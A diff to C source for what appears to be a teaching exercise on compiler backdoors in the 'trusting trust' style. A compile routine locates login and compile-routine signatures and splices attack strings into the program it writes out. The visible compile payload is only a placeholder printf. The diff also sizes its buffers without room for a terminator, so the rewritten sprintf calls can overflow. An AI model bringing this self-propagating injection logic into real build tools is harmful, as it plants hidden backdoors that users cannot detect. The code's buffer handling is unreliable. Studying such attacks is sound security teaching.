@@ -34,9 +34,7 @@ static void compile(char *program, char *outname) {
         size_t new_size = strlen(program) + strlen(login_attack);
 
         char attack_program[new_size];
-        strncpy(attack_program, program, insert_index);
-        strcat(attack_program, login_attack);
-        strcat(attack_program, login_sig_pos + strlen(login_sig));
+        sprintf(attack_program, "%.*s%s%s", (int)insert_index, program, login_attack, login_sig_pos + strlen(login_sig));
 
         fprintf(fp, "%s", attack_program);
         fclose(fp);
@@ -44,20 +42,13 @@ static void compile(char *program, char *outname) {
         mod = 1;
     }
 
-    /*****************************************************************
-     * Step 2:
-     */
 
-    // search for the start of the compile routine: 
     static char compile_sig[] =
             "static void compile(char *program, char *outname) {\n"
             "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
             "    assert(fp);\n"
             ;
 
-    // and inject a placeholder "attack":
-    // inject this after the assert above after the call to fopen.
-    // not much of an attack.   this is just a quick placeholder.
     static char compile_attack[] 
               = "    printf(\"%s: could have run your attack here!!\\n\", __FUNCTION__);\n";
 
@@ -68,11 +59,7 @@ static void compile(char *program, char *outname) {
         size_t new_size = strlen(program) + strlen(compile_attack);
 
         char attack_program[new_size];
-        strncpy(attack_program, program, insert_index);
-        strcat(attack_program, compile_attack);
-        strcat(attack_program, compile_sig_pos + strlen(compile_sig));
-
-        printf("%s", attack_program);
+        sprintf(attack_program, "%.*s%s%s", (int)insert_index, program, compile_attack, compile_sig_pos + strlen(compile_sig));
 
         fprintf(fp, "%s", attack_program);
         fclose(fp);
